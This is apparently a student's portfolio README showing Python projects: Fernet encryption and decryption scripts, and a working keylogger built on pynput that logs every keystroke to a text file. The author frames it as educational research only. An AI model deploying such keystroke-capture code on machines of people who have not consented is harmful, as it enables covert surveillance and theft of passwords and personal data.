##### [LinkedIn](https://www.linkedin.com/in/allana-gibson/)
##### [Merit Page](https://meritpages.com/Allana-Gibson/5963308)
##### [Resume](https://github.com/Allana-Gibson/Personal-Projects/files/8082930/Allana_Gibson_Resume.1.pdf)


# Cryptography Project

- Helps to encrypt a plain text,key,number or a word phrase using cryptographic algorithm. 
- The text can be hidden from others except the sender and the receiver.

### Here is the source code of my 3 program files (in python):

```markdown
# this script creates the key to encrypt and decrypt with

from cryptography.fernet import Fernet
key = Fernet.generate_key() #this generates a random key each time its called
print(key)

# so we need to write the key to a file so we use the same one each time
file = open('key.file', 'wb')
file.write(key) #key is a byte and it stores it into a file
file.close()
```
- The output will extract the key.

### Here is a picture of the output file:
![image1](https://user-images.githubusercontent.com/53357849/158883036-850e9223-26e6-45bc-a3e0-5768ec56d67f.png)


```markdown
from cryptography.fernet import Fernet

#First get the key from the imported file
file = open('key.file', 'rb')
key = file.read()
file.close()

#this will encode the message
message = "Hello! This is my secret message"
encoded = message.encode() #this converts the message to bytes

#this will encrypt the message
f = Fernet(key)
encrypted = f.encrypt(encoded)
print (encrypted)

# saves encrypted message into file
file = open('encrypted.message', 'wb')
file.write(encrypted)
file.close()
```
- The output will print the encrypted message.

### Here is a picture of the output file:
![image2](https://user-images.githubusercontent.com/53357849/158883138-5f960089-6d81-4045-810e-55c2c93feb8e.png)



```markdown
from cryptography.fernet import Fernet

#First get the key from the imported file
file = open('key.file', 'rb')
key = file.read()
file.close()

#Then get the encrypted message
file = open('encrypted.message', 'rb')
message = file.read()
file.close()

#This decrypts the encrypted message
f2 = Fernet(key)
decrypted = f2.decrypt(message)

#this decodes the message from byte to sting
original_message = decrypted.decode()
print(original_message)


#saves ogininal message into a file
file = open('original.message', 'wb')
file.write(decrypted)
file.close()

```
- The output will decrypt the encrypted message and save it into a file.

### Here is a picture of the output file:
![image3](https://user-images.githubusercontent.com/53357849/158883287-8ce02402-67fc-40bd-96a7-240b2d2c37b1.png)


# KeyLogger Project

- A keylogger is a type of monitoring software `or malware` that is used to collect every keystroke the user types.
#### Reasons for use:
1. Hackers trying to access **personal data**.
2. IT organizations attempting to troubleshoot **technical problems**.

- I did this for educational research ONLY.

### Here is the source code of my program (in python):

```markdown
from pynput.keyboard import Key, Listener
import logging

logKeystroke = ""

logging.basicConfig(filename=(logKeystroke + "key_log.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')
                                                                   # prints the text with date & time
def on_press(key):
    logging.info(str(key)) #when a key is pressed it will store the info in file

with Listener(on_press=on_press) as listener:
    listener.join()

```
- The output will extract a `.txt` file on to the folder displaying every keystroke pressed.
- The user will have to terminate the program in `Task Manager` to end the application.

### Here is a picture of the output file:
![snippen2](https://user-images.githubusercontent.com/53357849/154188508-899104ba-b2a2-4264-bd5e-d8b9ad0b3fdc.png)

